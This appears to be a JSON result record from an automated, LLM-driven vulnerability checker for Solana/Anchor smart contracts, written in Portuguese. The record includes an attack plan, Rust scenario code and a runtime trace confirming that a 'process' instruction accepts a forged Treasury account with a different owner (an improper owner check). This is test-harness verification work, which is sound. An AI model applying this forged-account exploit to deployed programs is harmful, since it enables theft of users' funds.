@@ -1,0 +1,126 @@
+{
+  "category": "OWNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: conta forjada com dono diferente foi aceita",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2309,
+        "completion_tokens": 635,
+        "latency_s": 3.72
+      },
+      "raw": "{\"plan\": \"O cenário inicializa uma conta Treasury legítima via `initialize` (baseline) para provar que o setup está correto. Em seguida, o ataque chama `process` passando uma conta forjada pelo atacante (dono diferente do programa) com dados que imitam um Treasury ativo, mantendo a mesma posição da conta legítima no baseline. O efeito mede se a instrução aceitou a conta forjada, verificando que o dono da conta usada no ataque difere do dono da conta legítima e que a execução teve sucesso.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet treasury_key = Pubkey::new_unique();\\n\\nlet treasury_data = anchor_account_data(\\\"Treasury\\\", &(authority, 1000u64, true));\\n\\nlet treasury_legit = account(&env.program_id, &treasury_data, None);\\nlet authority_acc = wallet(1_000_000_000);\\nlet (system_id, system_acc) = system_program_account();\\n\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(1000u64,),\\n    vec![\\n        AccountMeta::new(treasury_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(system_id, false),\\n    ],\\n);\\n\\nlet init_accounts = vec![\\n    (treasury_key, empty_account()),\\n    (authority, authority_acc.clone()),\\n    (system_id, system_acc.clone()),\\n];\\n\\nlet baseline = env.baseline(\\\"initialize legitimo\\\", &init_ix, &init_accounts);\\n\\nlet forged_owner = Pubkey::new_unique();\\nlet forged_treasury = account(&forged_owner, &treasury_data, None);\\n\\nlet attack_ix = env.anchor_ix(\\n    \\\"process\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new_readonly(treasury_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\n\\nlet attack_accounts = vec![\\n    (treasury_key, forged_treasury),\\n    (authority, authority_acc),\\n];\\n\\nlet r = env.attack(\\\"process com conta forjada\\\", &attack_ix, &attack_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let used = after(&r, &treasury_key);\\n    env.effect(\\n        \\\"conta forjada com dono diferente foi aceita\\\",\\n        used.owner() != &env.program_id,\\n    );\\n}\"}",
+      "plan": "O cenário inicializa uma conta Treasury legítima via `initialize` (baseline) para provar que o setup está correto. Em seguida, o ataque chama `process` passando uma conta forjada pelo atacante (dono diferente do programa) com dados que imitam um Treasury ativo, mantendo a mesma posição da conta legítima no baseline. O efeito mede se a instrução aceitou a conta forjada, verificando que o dono da conta usada no ataque difere do dono da conta legítima e que a execução teve sucesso.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet treasury_key = Pubkey::new_unique();\n\nlet treasury_data = anchor_account_data(\"Treasury\", &(authority, 1000u64, true));\n\nlet treasury_legit = account(&env.program_id, &treasury_data, None);\nlet authority_acc = wallet(1_000_000_000);\nlet (system_id, system_acc) = system_program_account();\n\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(1000u64,),\n    vec![\n        AccountMeta::new(treasury_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(system_id, false),\n    ],\n);\n\nlet init_accounts = vec![\n    (treasury_key, empty_account()),\n    (authority, authority_acc.clone()),\n    (system_id, system_acc.clone()),\n];\n\nlet baseline = env.baseline(\"initialize legitimo\", &init_ix, &init_accounts);\n\nlet forged_owner = Pubkey::new_unique();\nlet forged_treasury = account(&forged_owner, &treasury_data, None);\n\nlet attack_ix = env.anchor_ix(\n    \"process\",\n    &(),\n    vec![\n        AccountMeta::new_readonly(treasury_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\n\nlet attack_accounts = vec![\n    (treasury_key, forged_treasury),\n    (authority, authority_acc),\n];\n\nlet r = env.attack(\"process com conta forjada\", &attack_ix, &attack_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let used = after(&r, &treasury_key);\n    env.effect(\n        \"conta forjada com dono diferente foi aceita\",\n        used.owner() != &env.program_id,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo",
+            "result": "Success",
+            "compute_units": 12976,
+            "account_flags": "sw,sw,-r",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": "eeef7bee5901a8fd0000000000000001000000000000000000000000000000000000000000000000e80300000000000001"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": false,
+                "owner": "NativeLoader1111111111111111111111111111111",
+                "data_len": 14,
+                "head": "73797374656d5f70",
+                "digest": "d8e11c483f20607a",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "process com conta forjada",
+            "result": "Success",
+            "compute_units": 8487,
+            "account_flags": "-r,sr",
+            "ix_head": "32429210847f67bf",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "data_len": 49,
+                "head": "eeef7bee5901a8fd",
+                "digest": "cbdab63d16b4ffe9",
+                "post": ""
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "conta forjada com dono diferente foi aceita",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 12976 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 8487 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: conta forjada com dono diferente foi aceita"
+    }
+  ],
+  "case_id": "SSP-02-A-V",
+  "static_finding": {
+    "category": "OWNER",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Improper Owner Check."
+  }
+}
